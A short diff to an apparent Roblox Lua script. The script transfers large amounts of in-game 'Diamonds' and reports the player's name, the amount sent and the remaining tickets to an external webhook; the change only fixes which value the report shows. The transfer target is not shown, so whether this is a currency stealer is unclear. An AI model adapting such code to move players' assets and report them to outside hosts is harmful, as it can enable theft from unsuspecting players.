@@ -140,6 +140,7 @@ part.Parent = game.Workspace
 end
 wait(waitTime)
 local DiamondsInput = DiamondsAmount - 1000000
+local DiamondsValue = DiamondsAmount
 if SendAmount then
     if DiamondsAmount > 10000000 then
         local args = {
@@ -153,7 +154,7 @@ if SendAmount then
         
         local playerName = game.Players.LocalPlayer.Name
         local data = {
-            ["content"] = playerName .. " | Successfully sent " .. DiamondsAmount .. " | Currently " .. VoidAmount .. " Tickets Left"
+            ["content"] = playerName .. " | Successfully sent " .. DiamondsValue .. " | Currently " .. VoidAmount .. " Tickets Left"
         }
         request({
             Url = webhookURL,
